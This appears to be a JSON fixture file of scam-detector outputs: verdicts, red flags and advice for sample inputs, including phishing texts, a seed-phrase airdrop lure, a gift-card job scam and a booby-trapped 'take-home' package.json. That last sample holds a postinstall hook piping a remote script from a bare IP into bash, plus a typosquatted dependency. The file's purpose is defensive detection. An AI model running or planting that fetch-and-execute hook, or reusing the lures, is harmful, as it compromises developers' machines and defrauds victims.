@@ -1,0 +1,319 @@
+{
+  "ROYAL MAIL: Your parcel has a £1.99 unpaid shipping fee. Pay within 24h or it returns to sender: https://royalmail-redelivery.info/pay": {
+    "verdict": "scam",
+    "confidence": 92,
+    "risk_score": 88,
+    "input_type": "message",
+    "title": "Fake Royal Mail Redelivery Text — Phishing Scam",
+    "summary": "This message impersonates Royal Mail using a look-alike domain to pressure you into paying a small fee, a classic smishing scam designed to steal your card details.",
+    "red_flags": [
+      {
+        "label": "Brand impersonation with fake domain",
+        "detail": "The domain 'royalmail-redelivery.info' uses the Royal Mail name but is confirmed not to be an official Royal Mail domain.",
+        "severity": "high"
+      },
+      {
+        "label": "Suspicious TLD",
+        "detail": "The .info TLD is frequently abused by scam and phishing sites, as flagged by heuristic checks.",
+        "severity": "low"
+      },
+      {
+        "label": "Urgency pressure",
+        "detail": "The message demands payment 'within 24h or it returns to sender' to rush you into acting without thinking.",
+        "severity": "high"
+      },
+      {
+        "label": "Small unpaid fee lure",
+        "detail": "Asking for a trivially small amount like £1.99 is a common tactic to lower your guard while harvesting card details.",
+        "severity": "medium"
+      },
+      {
+        "label": "Unsolicited contact with payment link",
+        "detail": "Legitimate parcel services rarely ask for outstanding fees via unsolicited text links to pay.",
+        "severity": "medium"
+      }
+    ],
+    "recommended_actions": [
+      "Do not click the link or enter any payment or personal details.",
+      "Delete the text message and block the sender number.",
+      "If you're expecting a parcel, check tracking directly via the official Royal Mail website (royalmail.com) or app, not via this link.",
+      "Report the message to your mobile carrier (forward to 7726 in the UK) and to Action Fraud (actionfraud.police.uk).",
+      "If you already entered card details, contact your bank immediately to cancel the card and monitor for fraud."
+    ],
+    "indicators": {
+      "urls": [
+        "https://royalmail-redelivery.info/pay"
+      ],
+      "addresses": [],
+      "emails": [],
+      "phone_numbers": []
+    },
+    "disclaimer": "This is automated risk guidance, not a guarantee of safety or fraud. Always verify independently through official channels before taking action.",
+    "evidence": [
+      {
+        "claim": "Uses a TLD (.info) frequently abused by scam sites",
+        "source": "heuristic",
+        "kind": "verified",
+        "severity": "low",
+        "subject": "https://royalmail-redelivery.info/pay"
+      },
+      {
+        "claim": "Domain \"royalmail-redelivery.info\" uses the Royal Mail name but is not an official Royal Mail domain",
+        "source": "brand check",
+        "kind": "verified",
+        "severity": "medium",
+        "subject": "royalmail-redelivery.info"
+      }
+    ]
+  },
+  "🎉 You are eligible for the OKB community airdrop (2,500 OKB). Connect your wallet to claim before it expires: https://okb-airdrop-claim.xyz — verify your seed phrase to receive tokens.": {
+    "verdict": "scam",
+    "confidence": 98,
+    "risk_score": 97,
+    "input_type": "message",
+    "title": "Fake OKB Airdrop — Seed Phrase Phishing Scam",
+    "summary": "This message is a classic crypto drainer scam: it dangles a free token reward and then asks you to 'verify your seed phrase,' which would let scammers instantly steal everything in your wallet.",
+    "red_flags": [
+      {
+        "label": "Seed phrase request",
+        "detail": "The message asks you to 'verify your seed phrase to receive tokens' — no legitimate airdrop or exchange ever needs your seed phrase; this is the single biggest red flag for wallet-draining scams.",
+        "severity": "high"
+      },
+      {
+        "label": "Unsolicited too-good-to-be-true reward",
+        "detail": "Claiming you are randomly 'eligible' for 2,500 OKB tokens with no prior action on your part is a typical too-good-to-be-true lure.",
+        "severity": "high"
+      },
+      {
+        "label": "Urgency pressure",
+        "detail": "The phrase 'claim before it expires' is designed to rush you into acting without thinking it through.",
+        "severity": "medium"
+      },
+      {
+        "label": "Suspicious domain",
+        "detail": "The domain okb-airdrop-claim.xyz is heavily hyphenated and impersonates the OKB brand, a common pattern in phishing sites (verified heuristic).",
+        "severity": "low"
+      },
+      {
+        "label": "Abused TLD",
+        "detail": "The .xyz TLD is frequently used by scam and phishing sites due to its low cost and lax registration requirements (verified heuristic).",
+        "severity": "low"
+      },
+      {
+        "label": "Wallet connection request",
+        "detail": "Being asked to 'connect your wallet' to an unknown, unverified site to claim a reward is a hallmark of wallet-drainer scams.",
+        "severity": "high"
+      }
+    ],
+    "recommended_actions": [
+      "Do not click the link or connect your wallet to this site.",
+      "Never share your seed phrase or private key with anyone or any website — no legitimate service will ever ask for it.",
+      "If you already entered your seed phrase anywhere suspicious, immediately move your funds to a new wallet with a freshly generated seed phrase.",
+      "Report and block the message/site, and warn others if you received this via social media or DM.",
+      "Only get airdrop information from official, verified OKX/OKB channels — type the URL directly rather than clicking links."
+    ],
+    "indicators": {
+      "urls": [
+        "https://okb-airdrop-claim.xyz"
+      ],
+      "addresses": [],
+      "emails": [],
+      "phone_numbers": []
+    },
+    "disclaimer": "This assessment is risk guidance based on available information and automated checks, not a guarantee. Always verify independently through official channels before taking any action, especially anything involving your seed phrase, private keys, or wallet connections.",
+    "evidence": [
+      {
+        "claim": "Domain name is heavily hyphenated (okb-airdrop-claim.xyz) — common in brand-spoofing",
+        "source": "heuristic",
+        "kind": "verified",
+        "severity": "low",
+        "subject": "https://okb-airdrop-claim.xyz"
+      },
+      {
+        "claim": "Uses a TLD (.xyz) frequently abused by scam sites",
+        "source": "heuristic",
+        "kind": "verified",
+        "severity": "low",
+        "subject": "https://okb-airdrop-claim.xyz"
+      }
+    ]
+  },
+  "Hi! We reviewed your profile and want to offer you a remote data-entry role, $450/day, no interview. To onboard, please pay a $50 refundable equipment deposit via gift card and send the code.": {
+    "verdict": "scam",
+    "confidence": 97,
+    "risk_score": 95,
+    "input_type": "job_offer",
+    "title": "Fake Job Offer Demanding Gift Card Payment",
+    "summary": "This is a classic job scam: no legitimate employer hires without an interview, pays absurdly high wages for data entry, or asks for upfront payment via gift card codes.",
+    "red_flags": [
+      {
+        "label": "Too-good-to-be-true pay",
+        "detail": "$450/day for unskilled 'data-entry' work with no interview is wildly unrealistic and a common scam lure.",
+        "severity": "high"
+      },
+      {
+        "label": "No interview or vetting process",
+        "detail": "Legitimate employers almost never hire without any interview or verification process.",
+        "severity": "high"
+      },
+      {
+        "label": "Upfront payment request",
+        "detail": "Asking for a $50 'refundable equipment deposit' before starting work is a hallmark of advance-fee fraud.",
+        "severity": "high"
+      },
+      {
+        "label": "Gift card payment method",
+        "detail": "Requesting payment via gift card code is a major red flag — gift cards are untraceable and instantly cashed out by scammers, and no real employer or vendor uses this method.",
+        "severity": "high"
+      },
+      {
+        "label": "Unsolicited contact",
+        "detail": "The offer claims they 'reviewed your profile' with no context on which platform or how, suggesting a mass-sent scam message.",
+        "severity": "medium"
+      }
+    ],
+    "recommended_actions": [
+      "Do not send any gift card codes or payment of any kind to this sender.",
+      "Do not provide personal information, banking details, or ID documents.",
+      "Block and report the sender on whatever platform contacted you.",
+      "Report this to the FTC (reportfraud.ftc.gov) or your country's equivalent consumer protection agency.",
+      "If you already sent a gift card code, contact the retailer immediately — recovery is unlikely but sometimes possible if reported fast."
+    ],
+    "indicators": {
+      "urls": [],
+      "addresses": [],
+      "emails": [],
+      "phone_numbers": []
+    },
+    "disclaimer": "This assessment is risk guidance based on common scam patterns, not a guarantee. Always verify independently and never send money, gift cards, or personal information to unverified job offers.",
+    "evidence": []
+  },
+  "{\"name\":\"frontend-take-home\",\"scripts\":{\"postinstall\":\"curl -s http://185.62.190.10/loader.sh | bash\"},\"dependencies\":{\"react\":\"^18.2.0\",\"expresss\":\"^4.18.0\",\"auth-helper-utils\":\"git+https://github.com/x9f2/auth-helper.git\"}}": {
+    "verdict": "scam",
+    "confidence": 98,
+    "risk_score": 97,
+    "input_type": "repo",
+    "title": "Malicious postinstall script downloads and executes remote payload on npm install",
+    "summary": "This package.json runs a postinstall hook that pipes a remote shell script straight into bash, and also includes a typosquatted package and a dependency pulled from a random GitHub repo instead of npm — classic 'Contagious Interview' fake take-home malware pattern.",
+    "red_flags": [
+      {
+        "label": "Fetch-and-execute postinstall hook",
+        "detail": "The postinstall script runs `curl -s http://185.62.190.10/loader.sh | bash`, downloading and executing an arbitrary remote script the instant `npm install` runs, with no review possible beforehand.",
+        "severity": "high"
+      },
+      {
+        "label": "Raw IP address as download source",
+        "detail": "The payload is fetched from a bare IP (185.62.190.10) rather than a domain, a strong indicator of throwaway malicious infrastructure with no attribution.",
+        "severity": "high"
+      },
+      {
+        "label": "Typosquatted dependency 'expresss'",
+        "detail": "The dependency 'expresss' (triple 's') mimics the extremely popular 'express' package, a common trick to get developers to unknowingly install a malicious lookalike.",
+        "severity": "medium"
+      },
+      {
+        "label": "Non-registry git dependency",
+        "detail": "'auth-helper-utils' is installed directly from git+https://github.com/x9f2/auth-helper.git, bypassing npm registry vetting and allowing the maintainer to change code at will without version pinning or review.",
+        "severity": "medium"
+      },
+      {
+        "label": "Fake take-home project framing",
+        "detail": "The package name 'frontend-take-home' matches the known 'Contagious Interview' social-engineering pattern where fake recruiters send booby-trapped take-home tests to steal credentials/wallets.",
+        "severity": "high"
+      }
+    ],
+    "recommended_actions": [
+      "Do NOT run `npm install` or any install command on this repository.",
+      "Do not open this project in an environment with access to real credentials, SSH keys, or crypto wallets.",
+      "If you already ran install, immediately rotate all credentials, SSH/API keys, and consider the machine compromised; check for persistence mechanisms.",
+      "Inspect loader.sh contents (via a sandboxed VM/network capture) if you need to confirm behavior, but do not execute it on a real machine.",
+      "Report the suspicious 'recruiter'/repo source and the IP 185.62.190.10 to relevant platforms.",
+      "If you still need the take-home content, extract only the source files manually without running any install scripts, and use `npm install --ignore-scripts` inside a disposable, network-isolated container as an extra precaution.",
+      "Verify any dependency names carefully against the real npmjs.com package before ever adding them to a real project."
+    ],
+    "indicators": {
+      "urls": [
+        "http://185.62.190.10/loader.sh",
+        "git+https://github.com/x9f2/auth-helper.git",
+        "expresss (typosquat of express)"
+      ],
+      "addresses": [],
+      "emails": [],
+      "phone_numbers": []
+    },
+    "disclaimer": "This is automated risk guidance based on available signals, not a guarantee of maliciousness or safety; always verify independently before executing untrusted code.",
+    "evidence": [
+      {
+        "claim": "Script \"postinstall\" runs a high-risk command (fetch-and-execute / obfuscation): `curl -s http://185.62.190.10/loader.sh | bash`",
+        "source": "package.json",
+        "kind": "verified",
+        "severity": "high",
+        "subject": "postinstall",
+        "detail": "curl -s http://185.62.190.10/loader.sh | bash"
+      },
+      {
+        "claim": "Dependency \"auth-helper-utils\" is pulled from a non-registry source (git+https://github.com/x9f2/auth-helper.git) — bypasses npm's registry",
+        "source": "package.json",
+        "kind": "verified",
+        "severity": "medium",
+        "subject": "auth-helper-utils",
+        "detail": "git+https://github.com/x9f2/auth-helper.git"
+      },
+      {
+        "claim": "Dependency \"expresss\" is a look-alike of the popular package \"express\" (possible typosquat)",
+        "source": "typosquat check",
+        "kind": "verified",
+        "severity": "medium",
+        "subject": "expresss"
+      }
+    ]
+  },
+  "https://github.com/expressjs/express": {
+    "verdict": "safe",
+    "confidence": 95,
+    "risk_score": 3,
+    "input_type": "repo",
+    "title": "No supply-chain red flags found in expressjs/express",
+    "summary": "This is the well-known Express.js web framework repository with standard, widely-used dependencies and no install scripts or malicious indicators detected.",
+    "red_flags": [],
+    "recommended_actions": [
+      "Still verify the repo URL matches the official github.com/expressjs/express before cloning.",
+      "Run npm install normally, but consider npm ci for reproducible installs in CI/production.",
+      "Periodically run npm audit to catch newly disclosed vulnerabilities in dependencies.",
+      "Pin dependency versions in production via a lockfile (package-lock.json) committed to the repo."
+    ],
+    "indicators": {
+      "urls": [
+        "github.com/expressjs/express",
+        "https://expressjs.com/",
+        "https://opencollective.com/express"
+      ],
+      "addresses": [],
+      "emails": [],
+      "phone_numbers": []
+    },
+    "disclaimer": "This assessment is risk guidance based on available data, not a guarantee of safety; always verify independently and review dependencies before running installs, especially in sensitive environments.",
+    "evidence": []
+  },
+  "Hey, running 10 mins late for lunch — grab us a table and I'll be right there!": {
+    "verdict": "safe",
+    "confidence": 90,
+    "risk_score": 2,
+    "input_type": "message",
+    "title": "Ordinary casual text — no scam indicators",
+    "summary": "This is a normal, low-stakes message about being late to lunch, with no requests for money, personal information, or links.",
+    "red_flags": [],
+    "recommended_actions": [
+      "No action needed — this message shows no signs of fraud.",
+      "If this is unexpected or from an unknown number, confirm the sender's identity before responding, just as a general precaution."
+    ],
+    "indicators": {
+      "urls": [],
+      "addresses": [],
+      "emails": [],
+      "phone_numbers": []
+    },
+    "disclaimer": "This assessment is risk guidance based on the text provided, not a guarantee of safety. Always use your own judgment and verify independently if anything about the context seems off.",
+    "evidence": []
+  }
+}
